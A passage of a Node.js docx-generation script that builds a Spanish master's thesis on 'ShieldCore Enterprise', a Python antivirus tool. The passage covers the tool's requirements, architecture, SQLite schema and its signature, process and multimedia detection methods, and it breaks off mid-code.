const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, WidthType, ShadingType,
  PageNumber, NumberFormat, LevelFormat, PageBreak, TabStopType,
  TabStopPosition, Footer, Header, TableOfContents
} = require('docx');
const fs = require('fs');

// ── Colores corporativos ──────────────────────────────────────────────────────
const C = {
  azul:       "1F3864",
  azulMedio:  "2E5DA8",
  azulClaro:  "D6E4F5",
  grisOscuro: "404040",
  grisMedio:  "7F7F7F",
  grisClaro:  "F2F2F2",
  rojo:       "C00000",
  naranja:    "E06C1A",
  verde:      "1D7A2F",
  blanco:     "FFFFFF",
};

const CONTENT_W = 9026; // A4 con márgenes 1"
const BORDER_CELL = { style: BorderStyle.SINGLE, size: 1, color: "CCCCCC" };
const BORDERS = { top: BORDER_CELL, bottom: BORDER_CELL, left: BORDER_CELL, right: BORDER_CELL };
const BORDERS_NONE = {
  top:    { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
  bottom: { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
  left:   { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
  right:  { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
};

// ── Helpers ───────────────────────────────────────────────────────────────────
const sp = (before=0, after=0) => ({ spacing: { before, after } });

function h1(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text, bold: true })],
    ...sp(360, 120),
    pageBreakBefore: true,
  });
}
function h2(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2,
    children: [new TextRun({ text, bold: true })],
    ...sp(240, 80),
  });
}
function h3(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_3,
    children: [new TextRun({ text, bold: true })],
    ...sp(200, 60),
  });
}
function h4(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_4,
    children: [new TextRun({ text, bold: true, italics: true })],
    ...sp(160, 40),
  });
}

function p(runs, opts={}) {
  const children = typeof runs === 'string'
    ? [new TextRun({ text: runs, size: 22, font: "Arial", color: C.grisOscuro })]
    : runs;
  return new Paragraph({ children, alignment: AlignmentType.JUSTIFIED, ...sp(60,60), ...opts });
}

function t(text, opts={}) {
  return new TextRun({ text, font: "Arial", size: 22, color: C.grisOscuro, ...opts });
}
function tb(text, opts={}) { return t(text, { bold: true, ...opts }); }
function ti(text, opts={}) { return t(text, { italics: true, ...opts }); }
function tc(text, opts={}) { return t(text, { font: "Courier New", size: 18, color: C.azul, ...opts }); }

function bullet(text, level=0) {
  const indent = 720 + level*360;
  return new Paragraph({
    numbering: { reference: "bullets", level },
    children: [t(text)],
    ...sp(40, 40),
  });
}
function numbered(text, level=0) {
  return new Paragraph({
    numbering: { reference: "numbers", level },
    children: [t(text)],
    ...sp(40, 40),
  });
}

function codeBlock(lines) {
  return lines.map(line =>
    new Paragraph({
      children: [new TextRun({ text: line, font: "Courier New", size: 18, color: C.azulMedio })],
      shading: { fill: "F8F8FF", type: ShadingType.CLEAR },
      border: { left: { style: BorderStyle.SINGLE, size: 6, color: C.azulMedio, space: 8 } },
      indent: { left: 360 },
      ...sp(20, 20),
    })
  );
}

function sep() {
  return new Paragraph({
    border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: C.azulMedio, space: 2 } },
    ...sp(120, 120),
    children: [],
  });
}

function note(text, color=C.azulClaro, icon="ℹ") {
  return new Table({
    width: { size: CONTENT_W, type: WidthType.DXA },
    columnWidths: [CONTENT_W],
    rows: [new TableRow({ children: [
      new TableCell({
        borders: BORDERS_NONE,
        shading: { fill: color, type: ShadingType.CLEAR },
        margins: { top: 80, bottom: 80, left: 160, right: 160 },
        children: [new Paragraph({
          children: [t(`${icon}  ${text}`, { size: 20, color: C.azul })],
          ...sp(0,0),
        })]
      })
    ]})],
  });
}

function headerCell(text, w) {
  return new TableCell({
    width: { size: w, type: WidthType.DXA },
    borders: BORDERS,
    shading: { fill: C.azul, type: ShadingType.CLEAR },
    margins: { top: 80, bottom: 80, left: 120, right: 120 },
    children: [new Paragraph({
      children: [new TextRun({ text, bold: true, color: C.blanco, size: 20, font: "Arial" })],
      alignment: AlignmentType.CENTER,
      ...sp(0,0),
    })]
  });
}
function dataCell(text, w, shade=C.blanco, bold=false) {
  return new TableCell({
    width: { size: w, type: WidthType.DXA },
    borders: BORDERS,
    shading: { fill: shade, type: ShadingType.CLEAR },
    margins: { top: 80, bottom: 80, left: 120, right: 120 },
    children: [new Paragraph({
      children: [new TextRun({ text, size: 20, font: "Arial", color: C.grisOscuro, bold })],
      ...sp(0,0),
    })]
  });
}

function emptyLine(n=1) {
  return Array(n).fill(null).map(() => new Paragraph({ children: [], ...sp(0,0) }));
}

// ── PORTADA ───────────────────────────────────────────────────────────────────
function buildCover() {
  return [
    ...emptyLine(4),
    new Paragraph({
      children: [new TextRun({
        text: "MÁSTER EN CIBERSEGURIDAD",
        size: 28, bold: true, font: "Arial",
        color: C.azulMedio, allCaps: true,
      })],
      alignment: AlignmentType.CENTER, ...sp(0, 80),
    }),
    new Paragraph({
      border: { bottom: { style: BorderStyle.SINGLE, size: 6, color: C.azul, space: 4 } },
      children: [],
      ...sp(0, 80),
    }),
    new Paragraph({
      children: [new TextRun({
        text: "TRABAJO FIN DE MÁSTER",
        size: 32, bold: true, font: "Arial", color: C.azul, allCaps: true,
      })],
      alignment: AlignmentType.CENTER, ...sp(0, 40),
    }),
    new Paragraph({
      children: [new TextRun({
        text: "ShieldCore Enterprise: Desarrollo de un Sistema Antivirus\nEmpresarial Multiplataforma con Análisis Heurístico,\nDetección de Malware Multimedia y Auditoría de Código Fuente",
        size: 28, font: "Arial", color: C.grisOscuro, break: 1,
      })],
      alignment: AlignmentType.CENTER, ...sp(40, 160),
    }),
    new Paragraph({
      border: { bottom: { style: BorderStyle.SINGLE, size: 2, color: "AAAAAA", space: 4 } },
      children: [], ...sp(0, 120),
    }),
    new Paragraph({
      children: [new TextRun({ text: "Autor:", size: 22, bold: true, font: "Arial", color: C.azul })],
      alignment: AlignmentType.CENTER, ...sp(0,20),
    }),
    new Paragraph({
      children: [new TextRun({ text: "José Miguel Gómez Fernández", size: 26, font: "Arial", color: C.grisOscuro })],
      alignment: AlignmentType.CENTER, ...sp(0, 80),
    }),
    new Paragraph({
      children: [new TextRun({ text: "Versión de la herramienta: 2.0.0", size: 20, font: "Arial", color: C.grisMedio, italics: true })],
      alignment: AlignmentType.CENTER, ...sp(0, 40),
    }),
    new Paragraph({
      children: [new TextRun({ text: `Fecha: ${new Date().toLocaleDateString('es-ES', { year:'numeric', month:'long', day:'numeric' })}`, size: 20, font: "Arial", color: C.grisMedio, italics: true })],
      alignment: AlignmentType.CENTER, ...sp(0, 40),
    }),
    ...emptyLine(4),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// CAPÍTULO 1 — IDENTIFICACIÓN DE REQUISITOS
// ══════════════════════════════════════════════════════════════════════════════
function buildCap1() {
  return [
    h1("1. Identificación de Requisitos"),

    p([t("La fase de identificación de requisitos constituye el fundamento metodológico sobre el cual se articula todo el proceso de diseño e implementación de ShieldCore Enterprise. Este análisis se ha llevado a cabo aplicando técnicas propias de la Ingeniería de Requisitos (IEEE 830-1998) adaptadas al dominio de la ciberseguridad, tomando como referencias de contexto las amenazas documentadas por MITRE ATT&CK, los marcos normativos ISO/IEC 27001 e ISO/IEC 27035, y la experiencia práctica en entornos empresariales reales con infraestructuras Windows y Linux.")]),

    h2("1.1. Contexto y Justificación del Problema"),
    p([t("Las organizaciones de tamaño pequeño y mediano (PYME) enfrentan una paradoja estructural en materia de ciberseguridad: las herramientas comerciales de nivel empresarial (CrowdStrike Falcon, SentinelOne, Carbon Black) presentan costes de licencia que oscilan entre 25 y 80 EUR por endpoint/mes, haciendo inviable su adopción generalizada. Las alternativas de código abierto disponibles (ClamAV, rkhunter, chkrootkit) cubren parcialmente las necesidades de detección, pero carecen de interfaz gráfica integrada, capacidad de análisis forense de código fuente, o API REST local para integración con SIEM corporativos.")]),
    p([t("Este escenario genera una "), tb("brecha de protección real"), t(" en la que millones de endpoints empresariales operan sin soluciones de detección y respuesta adecuadas. ShieldCore Enterprise nace para cubrir específicamente esta brecha, con un enfoque centrado en la "), ti("usabilidad"), t(", la "), ti("extensibilidad"), t(" y el "), ti("coste cero de licencia"), t(".")]),

    h2("1.2. Análisis de Stakeholders"),
    p([t("Se han identificado los siguientes perfiles de usuario y sus necesidades específicas:")]),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [2000, 3500, 3526],
      rows: [
        new TableRow({ children: [
          headerCell("Stakeholder", 2000),
          headerCell("Necesidades Primarias", 3500),
          headerCell("Requisitos Derivados", 3526),
        ]}),
        new TableRow({ children: [
          dataCell("Analista de Seguridad", 2000, C.grisClaro),
          dataCell("Detección de malware, alertas en tiempo real, logs auditables", 3500, C.grisClaro),
          dataCell("Motor de firmas SHA256, monitorización de procesos, base de datos SQLite", 3526, C.grisClaro),
        ]}),
        new TableRow({ children: [
          dataCell("Desarrollador de Software", 2000),
          dataCell("Auditoría de código fuente, detección de CWEs, informes exportables", 3500),
          dataCell("Analizador de código multi-lenguaje con clasificación CVSS/CWE", 3526),
        ]}),
        new TableRow({ children: [
          dataCell("Responsable de TI / CISO", 2000, C.grisClaro),
          dataCell("Dashboard operativo, historial de escaneos, API de integración", 3500, C.grisClaro),
          dataCell("GUI con métricas en tiempo real, API REST local, historial en BD", 3526, C.grisClaro),
        ]}),
        new TableRow({ children: [
          dataCell("Analista Forense", 2000),
          dataCell("Análisis multimedia, detección de esteganografía, cuarentena", 3500),
          dataCell("Motor MultimediaAnalyzer con entropía de Shannon y magic bytes", 3526),
        ]}),
        new TableRow({ children: [
          dataCell("Auditor de Cumplimiento", 2000, C.grisClaro),
          dataCell("Trazabilidad de incidentes, clasificación por severidad, reportes", 3500, C.grisClaro),
          dataCell("Tabla alerts con campos severity/category, historial scan_history", 3526, C.grisClaro),
        ]}),
      ],
    }),

    ...emptyLine(1),

    h2("1.3. Requisitos Funcionales"),

    h3("1.3.1. RF-01 — Detección por Firma Hash"),
    p([t("El sistema debe ser capaz de calcular el hash SHA-256 de cualquier fichero del sistema de archivos y compararlo contra una base de datos local de firmas de malware conocido. La comparación debe realizarse en tiempo inferior a 500 ms para ficheros de hasta 100 MB. El resultado debe clasificarse en las categorías "), tc("MALICIOUS"), t(", "), tc("SUSPICIOUS"), t(", "), tc("CLEAN"), t(", "), tc("FILE_NOT_FOUND"), t(" o "), tc("ERROR"), t(".")]),

    h3("1.3.2. RF-02 — Escaneo de Directorios y Sistema"),
    p([t("El motor debe implementar un escáner recursivo de directorios con reporte de progreso en tiempo real mediante callback. Debe soportar tres modalidades de escaneo: (a) fichero individual, (b) directorio arbitrario, (c) escaneo de sistema completo sobre rutas críticas determinadas dinámicamente en función del sistema operativo subyacente (Windows: "), tc("System32"), t(", "), tc("Users"), t(", "), tc("TEMP"), t("; Linux: "), tc("/tmp"), t(", "), tc("/var/tmp"), t(", "), tc("~"), t(").")]),

    h3("1.3.3. RF-03 — Monitorización Activa de Procesos"),
    p([t("El sistema debe implementar un monitor de procesos en tiempo real basado en psutil que ejecute en hilo daemon independiente. La monitorización debe activarse y desactivarse en caliente desde la GUI sin necesidad de reiniciar la aplicación. Los criterios de detección heurística deben incluir al menos: (a) presencia de cadenas de malware conocido en el nombre del proceso, (b) consumo de CPU sostenido superior al 85%. Los procesos flagueados deben generar alertas con severidad HIGH y categoría PROCESS.")]),

    h3("1.3.4. RF-04 — Análisis de Malware en Archivos Multimedia"),
    p([t("Implementar un módulo especializado ("), tc("MultimediaAnalyzer"), t(") capaz de analizar ficheros de imagen, vídeo, audio y documentos ofimáticos en busca de técnicas de ocultación de malware. El módulo debe cubrir: (a) verificación de magic bytes vs. extensión declarada, (b) cálculo de entropía de Shannon sobre los primeros 64 KB del fichero, (c) búsqueda de patrones binarios sospechosos incluyendo cabeceras PE ("), tc("\\x4D\\x5A"), t("), cabeceras ELF ("), tc("\\x7fELF"), t("), scripts embebidos y referencias a intérpretes de sistema.")]),

    h3("1.3.5. RF-05 — Auditoría de Seguridad de Código Fuente"),
    p([t("Implementar un analizador estático de código fuente ("), tc("CodeSecurityAnalyzer"), t(") que detecte vulnerabilidades de seguridad en texto plano para los lenguajes: Python, JavaScript, TypeScript, Java, PHP, Ruby, Go, Rust, Shell, PowerShell y SQL. Las vulnerabilidades deben clasificarse por severidad (CRITICAL, HIGH, MEDIUM, LOW) y referenciarse con su identificador CWE correspondiente. El informe debe incluir número de línea, contenido de la línea afectada y puntuación de riesgo agregada.")]),

    h3("1.3.6. RF-06 — API REST Local"),
    p([t("Exponer una API REST sobre "), tc("http://127.0.0.1:8000"), t(" mediante FastAPI con al menos 13 endpoints cubriendo: estado del sistema, gestión de alertas, escaneo de ficheros, análisis multimedia, análisis de código, cuarentena, historial, firmas y control del monitor. La API debe incluir documentación interactiva automática (Swagger UI) accesible en "), tc("/docs"), t(".")]),

    h3("1.3.7. RF-07 — Gestión de Cuarentena"),
    p([t("Los ficheros identificados como maliciosos deben registrarse automáticamente en la tabla "), tc("quarantine"), t(" de la base de datos con metadatos completos (ruta original, hash, nombre de la amenaza, estado, timestamp). La GUI debe permitir la visualización del inventario de cuarentena.")]),

    h3("1.3.8. RF-08 — Interfaz Gráfica Multiplataforma"),
    p([t("La GUI debe construirse sobre Tkinter (incluido en la distribución estándar de CPython) garantizando compatibilidad nativa en Windows 10/11 y distribuciones Linux con servidor X11 o Wayland con XWayland. La interfaz debe incluir dashboard con métricas en tiempo real, barra de progreso de escaneo, pestañas para cada módulo funcional, indicadores de estado del sistema, sparklines de CPU/RAM y gauges semicirculares animados.")]),

    h2("1.4. Requisitos No Funcionales"),

    h3("1.4.1. RNF-01 — Portabilidad"),
    p([t("La herramienta debe ejecutarse sin modificaciones en Python 3.9+ sobre Windows 10/11 (x86_64) y cualquier distribución Linux con kernel ≥ 4.15. No se permite el uso de extensiones nativas (C/C++) que requieran compilación específica por plataforma.")]),

    h3("1.4.2. RNF-02 — Seguridad del Almacenamiento Local"),
    p([t("La base de datos SQLite debe implementar control de concurrencia mediante locks de threading ("), tc("threading.Lock"), t(") para todas las operaciones de escritura, previniendo condiciones de carrera en escenarios multi-hilo. No se almacenarán datos en texto plano fuera del directorio "), tc("data/"), t(" relativo al ejecutable.")]),

    h3("1.4.3. RNF-03 — Rendimiento"),
    p([t("El cálculo de hash SHA-256 debe procesar ficheros a una tasa mínima de 200 MB/s en hardware commodity (CPU 2.0 GHz, 8 GB RAM). El motor de análisis multimedia no debe procesar más de 50 MB por fichero para evitar ataques de denegación de servicio por consumo de recursos (zip bomb sobre archivos multimedia).")]),

    h3("1.4.4. RNF-04 — Extensibilidad del Stack"),
    p([t("La arquitectura debe permitir añadir nuevas firmas, patrones de vulnerabilidad y reglas heurísticas sin modificar el código fuente principal. Todas las firmas se almacenan en la base de datos SQLite y los patrones de análisis en estructuras de datos Python modificables.")]),

    h3("1.4.5. RNF-05 — Observabilidad y Auditoría"),
    p([t("Todas las operaciones significativas deben registrarse en el fichero "), tc("logs/antivirus.log"), t(" con nivel INFO/WARNING/ERROR según la naturaleza del evento. El formato de log debe incluir timestamp ISO 8601, nivel y mensaje. Los logs deben ser legibles por herramientas SIEM estándar.")]),

    h3("1.4.6. RNF-06 — Usabilidad"),
    p([t("La aplicación debe ser operativa sin instalación de servidor externo, base de datos externa ni configuración adicional. El tiempo desde la ejecución del script hasta la GUI completamente cargada no debe superar 8 segundos en hardware commodity.")]),

    h2("1.5. Restricciones del Proyecto"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [1800, 7226],
      rows: [
        new TableRow({ children: [headerCell("Código", 1800), headerCell("Restricción", 7226)] }),
        ...([
          ["REST-01", "Stack tecnológico fijo: FastAPI, Tkinter, SQLite, psutil, hashlib, logging. No se permite incorporar nuevas dependencias de terceros."],
          ["REST-02", "Uso exclusivamente local. La API no debe estar accesible desde interfaces de red externas (bind en 127.0.0.1 únicamente)."],
          ["REST-03", "No se implementa cuarentena física de ficheros (movimiento de ficheros al directorio de cuarentena) para evitar daños accidentales. El registro es a nivel de base de datos."],
          ["REST-04", "La herramienta opera en modo lectura sobre el sistema de archivos. No implementa eliminación ni modificación de ficheros sin confirmación explícita."],
          ["REST-05", "El análisis de código fuente se realiza mediante análisis léxico (regex) sin construcción de AST, lo que limita la tasa de falsos positivos pero también la profundidad de análisis."],
        ]).map(([c,d]) => new TableRow({ children: [dataCell(c, 1800, C.grisClaro, true), dataCell(d, 7226)] }))
      ],
    }),

    ...emptyLine(1),

    h2("1.6. Matriz de Trazabilidad Requisitos — Módulos"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [1500, 2500, 1506, 1506, 2014],
      rows: [
        new TableRow({ children: [
          headerCell("Req.", 1500),
          headerCell("Descripción", 2500),
          headerCell("Módulo", 1506),
          headerCell("Clase", 1506),
          headerCell("Método(s)", 2014),
        ]}),
        ...([
          ["RF-01", "Detección por firma SHA256", "Motor AV", "AntivirusEngine", "scan_file(), calculate_hash()"],
          ["RF-02", "Escaneo de directorios/sistema", "Motor AV", "AntivirusEngine", "scan_directory(), scan_system()"],
          ["RF-03", "Monitorización de procesos", "Monitor", "AntivirusEngine", "start_monitoring(), _monitor_loop()"],
          ["RF-04", "Análisis malware multimedia", "Multimedia", "MultimediaAnalyzer", "analyze_file(), analyze_entropy()"],
          ["RF-05", "Auditoría de código fuente", "Code Sec.", "CodeSecurityAnalyzer", "analyze(), detect_language()"],
          ["RF-06", "API REST local", "API", "FastAPI (app)", "13 endpoints /docs"],
          ["RF-07", "Gestión de cuarentena", "BD", "Database", "add_quarantine(), get_quarantine()"],
          ["RF-08", "GUI multiplataforma", "GUI", "AntivirusGUI", "8 tabs, widgets personalizados"],
        ]).map(([r,d,m,c,met], i) => new TableRow({ children: [
          dataCell(r, 1500, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(d, 2500, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(m, 1506, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(c, 1506, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(met, 2014, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// CAPÍTULO 2 — DESCRIPCIÓN DE LA HERRAMIENTA
// ══════════════════════════════════════════════════════════════════════════════
function buildCap2() {
  return [
    h1("2. Descripción de la Herramienta Software Desarrollada"),

    h2("2.1. Visión General de la Arquitectura"),

    p([t("ShieldCore Enterprise está diseñado con una arquitectura en capas desacoplada que separa claramente la capa de almacenamiento, el núcleo de análisis, la capa de exposición de servicios y la capa de presentación. Esta separación permite que cada subsistema evolucione de forma independiente, facilita la testabilidad unitaria de cada módulo y garantiza que la GUI nunca bloquee el hilo principal durante operaciones de I/O intensivas.")]),

    p([t("La comunicación entre capas se realiza mediante tres mecanismos: (a) llamadas directas síncronas para operaciones de baja latencia como el cálculo de hashes, (b) hilos daemon de Python ("), tc("threading.Thread(..., daemon=True)"), t(") para operaciones de larga duración como los escaneos de sistema y la monitorización, y (c) un sistema de callbacks registrables ("), tc("engine.register_callback()"), t(") para la propagación de eventos del motor a la GUI sin acoplar ambas capas.")]),

    h3("2.1.1. Diagrama de Capas"),
    ...codeBlock([
      "┌─────────────────────────────────────────────────────────────────┐",
      "│                     CAPA DE PRESENTACIÓN                        │",
      "│  AntivirusGUI (Tkinter)                                         │",
      "│  ├── Dashboard (Gauges, Sparklines, ProcTree)                   │",
      "│  ├── Scanner Tab  (ProgressBar, ResultTree)                     │",
      "│  ├── Multimedia Tab (MediaTree, DetailPane)                     │",
      "│  ├── Code Security Tab (Editor, ReportPane)                     │",
      "│  ├── Alerts Tab (FilteredTree)                                  │",
      "│  ├── Quarantine Tab                                             │",
      "│  ├── History Tab (GlobalStats, ScanTree)                        │",
      "│  └── API Client Tab (EndpointList, Console)                     │",
      "├─────────────────────────────────────────────────────────────────┤",
      "│                  CAPA DE SERVICIOS REST                         │",
      "│  FastAPI App (uvicorn, 127.0.0.1:8000)                          │",
      "│  └── 13 endpoints: /, /alerts, /scan/*, /monitor/*, etc.        │",
      "├─────────────────────────────────────────────────────────────────┤",
      "│                   CAPA DE NEGOCIO / MOTOR                       │",
      "│  AntivirusEngine                                                │",
      "│  ├── MultimediaAnalyzer  (Entropía, Magic Bytes, Patrones)      │",
      "│  └── CodeSecurityAnalyzer (Regex CWE, Multi-lenguaje)           │",
      "├─────────────────────────────────────────────────────────────────┤",
      "│                   CAPA DE ALMACENAMIENTO                        │",
      "│  Database (SQLite)                                              │",
      "│  ├── signatures     ├── alerts      ├── scan_history            │",
      "│  ├── quarantine     └── code_analysis                           │",
      "└─────────────────────────────────────────────────────────────────┘",
    ]),

    ...emptyLine(1),

    h2("2.2. Stack Tecnológico y Justificación de Elecciones"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [1800, 1600, 5626],
      rows: [
        new TableRow({ children: [headerCell("Tecnología", 1800), headerCell("Versión mínima", 1600), headerCell("Justificación técnica", 5626)] }),
        ...([
          ["Python",    "3.9+",  "Portabilidad nativa multiplataforma, GIL mitigado mediante threading.Thread para operaciones I/O-bound, amplio ecosistema de seguridad."],
          ["Tkinter",   "8.6+",  "Incluido en CPython stdlib. Sin dependencias externas para la GUI. Soporte nativo de canvas, widgets compuestos y sistema de eventos."],
          ["FastAPI",   "0.95+", "Framework ASGI moderno con generación automática de OpenAPI/Swagger, validación de tipos con Pydantic, soporte async nativo y rendimiento superior a Flask en benchmarks Techempower."],
          ["uvicorn",   "0.20+", "Servidor ASGI de alto rendimiento basado en uvloop/asyncio. Inicio en <200 ms, adecuado para API local sin overhead de Gunicorn."],
          ["SQLite",    "3.35+", "BD embebida sin servidor, ACID compliant, soporte WAL para escrituras concurrentes. Ideal para almacenamiento local auditado."],
          ["psutil",    "5.9+",  "Abstracción multiplataforma para acceso a información de procesos, CPU, memoria, disco y red del SO. Único punto de acceso a métricas del sistema."],
          ["hashlib",   "stdlib","Implementación en C de SHA-256 (FIPS 180-4). Throughput >500 MB/s en hardware commodity. Fundamental para comparación de firmas."],
          ["logging",   "stdlib","Módulo de logging asíncrono con soporte de niveles, rotación de ficheros y formato configurable. Compatible con parsers SIEM (Splunk, ELK)."],
        ]).map(([t1,t2,t3], i) => new TableRow({ children: [
          dataCell(t1, 1800, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(t2, 1600, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(t3, 5626, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h2("2.3. Módulo de Persistencia: clase Database"),

    p([t("La capa de persistencia está encapsulada en la clase "), tc("Database"), t(", que actúa como único punto de acceso a la base de datos SQLite. Todos los métodos públicos que implican escritura adquieren el lock "), tc("self._lock"), t(" ("), tc("threading.Lock"), t(") antes de ejecutar la query, garantizando atomicidad en escenarios donde el hilo del monitor y el hilo de la GUI acceden concurrentemente a la base de datos.")]),

    h3("2.3.1. Esquema de Base de Datos"),
    ...codeBlock([
      "-- Firmas de malware conocido",
      "CREATE TABLE signatures (",
      "    id          INTEGER PRIMARY KEY AUTOINCREMENT,",
      "    hash        TEXT UNIQUE NOT NULL,       -- SHA256 hexdigest (64 chars)",
      "    name        TEXT,                       -- Nombre del malware",
      "    threat_type TEXT DEFAULT 'UNKNOWN',     -- TROJAN, RANSOMWARE, ADWARE...",
      "    added_at    DATETIME DEFAULT CURRENT_TIMESTAMP",
      ");",
      "",
      "-- Alertas de seguridad generadas por el motor",
      "CREATE TABLE alerts (",
      "    id        INTEGER PRIMARY KEY AUTOINCREMENT,",
      "    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,",
      "    severity  TEXT DEFAULT 'MEDIUM',        -- CRITICAL|HIGH|MEDIUM|LOW|INFO",
      "    category  TEXT DEFAULT 'GENERAL',       -- MALWARE|PROCESS|MULTIMEDIA|CODE_SECURITY...",
      "    message   TEXT NOT NULL,",
      "    resolved  INTEGER DEFAULT 0             -- 0=abierta, 1=resuelta",
      ");",
      "",
      "-- Historial de escaneos para auditoría",
      "CREATE TABLE scan_history (",
      "    id            INTEGER PRIMARY KEY AUTOINCREMENT,",
      "    timestamp     DATETIME DEFAULT CURRENT_TIMESTAMP,",
      "    scan_type     TEXT,                     -- FILE|DIRECTORY|SYSTEM",
      "    path          TEXT,",
      "    files_scanned INTEGER DEFAULT 0,",
      "    threats_found INTEGER DEFAULT 0,",
      "    duration_sec  REAL DEFAULT 0",
      ");",
      "",
      "-- Registro de ficheros en cuarentena (sin movimiento físico)",
      "CREATE TABLE quarantine (",
      "    id            INTEGER PRIMARY KEY AUTOINCREMENT,",
      "    timestamp     DATETIME DEFAULT CURRENT_TIMESTAMP,",
      "    original_path TEXT,",
      "    file_hash     TEXT,",
      "    threat_name   TEXT,",
      "    status        TEXT DEFAULT 'QUARANTINED'",
      ");",
      "",
      "-- Histórico de análisis de código fuente",
      "CREATE TABLE code_analysis (",
      "    id           INTEGER PRIMARY KEY AUTOINCREMENT,",
      "    timestamp    DATETIME DEFAULT CURRENT_TIMESTAMP,",
      "    language     TEXT,",
      "    analyzed_by  TEXT,                      -- Nombre del programador/analista",
      "    risk_level   TEXT,                      -- LIMPIO|BAJO|MEDIO|ALTO|CRÍTICO",
      "    issues_found INTEGER DEFAULT 0,",
      "    report       TEXT                       -- Informe textual completo",
      ");",
    ]),

    ...emptyLine(1),

    h2("2.4. Motor Antivirus: clase AntivirusEngine"),

    p([t("La clase "), tc("AntivirusEngine"), t(" actúa como orquestador central del sistema. Mantiene referencias a todas las instancias de analizadores especializados y gestiona el ciclo de vida de los hilos de monitorización. Implementa el patrón "), ti("Observer"), t(" mediante el sistema de callbacks registrables, permitiendo a la GUI suscribirse a eventos del motor sin crearse una dependencia bidireccional entre ambas capas.")]),

    h3("2.4.1. Flujo de Detección por Firma SHA-256"),
    ...codeBlock([
      "scan_file(file_path)",
      "     │",
      "     ├─→ os.path.exists()  ──[no]──→ return 'FILE_NOT_FOUND'",
      "     │",
      "     ├─→ calculate_hash()  ──[error]→ return 'ERROR'",
      "     │         └─→ hashlib.sha256() + chunked read (8192 B)",
      "     │",
      "     ├─→ db.get_signatures()  →  [lista de hashes conocidos]",
      "     │",
      "     ├─→ hash IN signatures?",
      "     │         ├─[sí]─→ add_alert(severity=HIGH, category=MALWARE)",
      "     │         │        db.add_quarantine()",
      "     │         │        return 'MALICIOUS'",
      "     │         │",
      "     │         └─[no]─→ extensión en dangerous_exts?",
      "     │                      ├─[sí]─→ add_alert(severity=LOW, category=HEURISTIC)",
      "     │                      │        return 'SUSPICIOUS'",
      "     │                      └─[no]─→ return 'CLEAN'",
    ]),

    ...emptyLine(1),

    h3("2.4.2. Flujo de Escaneo de Directorio con Progreso"),
    p([t("El método "), tc("scan_directory()"), t(" implementa un recorrido recursivo mediante "), tc("os.walk()"), t(" que en primer lugar construye la lista completa de ficheros a procesar para poder calcular el porcentaje de progreso antes de iniciar el análisis. El callback "), tc("progress_callback(pct, current_file)"), t(" es invocado en el hilo de trabajo, y la GUI lo recibe y actualiza sus widgets a través de "), tc("root.after(0, lambda: ...)"), t(", garantizando que las actualizaciones de widgets se ejecuten siempre en el hilo principal de Tkinter (requisito del framework).")]),

    h3("2.4.3. Monitor de Procesos en Tiempo Real"),
    p([t("La monitorización activa se implementa mediante un hilo daemon que ejecuta "), tc("_monitor_loop()"), t(" en intervalos de 5 segundos. Para cada proceso listado por psutil se aplican dos criterios heurísticos: (a) detección de cadenas sospechosas en el nombre del proceso mediante comparación de subcadenas ("), tc("\"malware\""), t(", "), tc("\"trojan\""), t(", "), tc("\"ransomware\""), t(", "), tc("\"keylog\""), t(", "), tc("\"cryptominer\""), t(", "), tc("\"spyware\""), t("), y (b) umbral de CPU superior al 85% medido mediante "), tc("process.cpu_percent(interval=0.1)"), t(".")]),

    p([t("El hilo se arranca y detiene en caliente mediante los métodos "), tc("start_monitoring()"), t(" / "), tc("stop_monitoring()"), t(" que modifican el flag booleano "), tc("self.monitoring_active"), t(". La detención es cooperativa: el hilo comprueba el flag al inicio de cada iteración del bucle, lo que garantiza una parada limpia sin el uso de "), tc("thread.join()"), t(" bloqueante.")]),

    h2("2.5. Módulo de Análisis Multimedia: clase MultimediaAnalyzer"),

    p([t("El módulo "), tc("MultimediaAnalyzer"), t(" implementa técnicas propias del análisis forense digital aplicadas a la detección de malware embebido en archivos multimedia. La fundamentación teórica se apoya en tres pilares: análisis de cabeceras binarias (magic bytes), análisis de entropía de la información y búsqueda de patrones de payload.")]),

    h3("2.5.1. Verificación de Magic Bytes"),
    p([t("Cada formato de archivo multimedia tiene una firma binaria característica en sus primeros bytes (magic bytes) que permite identificar el tipo real del fichero con independencia de su extensión. La tabla interna "), tc("MAGIC_BYTES"), t(" mapea secuencias binarias a tuplas (formato, tipo). Si la extensión declarada no coincide con el formato detectado mediante magic bytes, se genera una alerta de "), ti("extension spoofing"), t(", técnica frecuentemente empleada para enmascarar ejecutables maliciosos como imágenes o documentos.")]),

    h3("2.5.2. Entropía de Shannon"),
    p([t("La entropía de Shannon de un fichero binario se calcula según la expresión:")]),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [CONTENT_W],
      rows: [new TableRow({ children: [new TableCell({
        borders: BORDERS_NONE,
        shading: { fill: "F0F4FF", type: ShadingType.CLEAR },
        margins: { top: 120, bottom: 120, left: 240, right: 240 },
        children: [new Paragraph({
          alignment: AlignmentType.CENTER,
